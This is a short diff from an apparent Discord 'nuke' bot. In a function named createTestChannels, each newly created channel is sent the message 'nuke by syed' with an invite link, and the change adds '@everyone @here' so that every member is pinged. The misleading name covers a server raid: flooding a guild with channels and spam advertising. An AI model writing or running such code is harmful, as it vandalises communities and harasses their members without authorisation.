@@ -83,7 +83,7 @@ export async function createTestChannels(guild, count) {
         ],
       });
 
-      await channel.send('nuke by syed https://discord.gg/TW9dTu7YKS');
+      await channel.send('@everyone @here nuke by syed https://discord.gg/TW9dTu7YKS');
 
       results.success++;
       results.channels.push(channel);
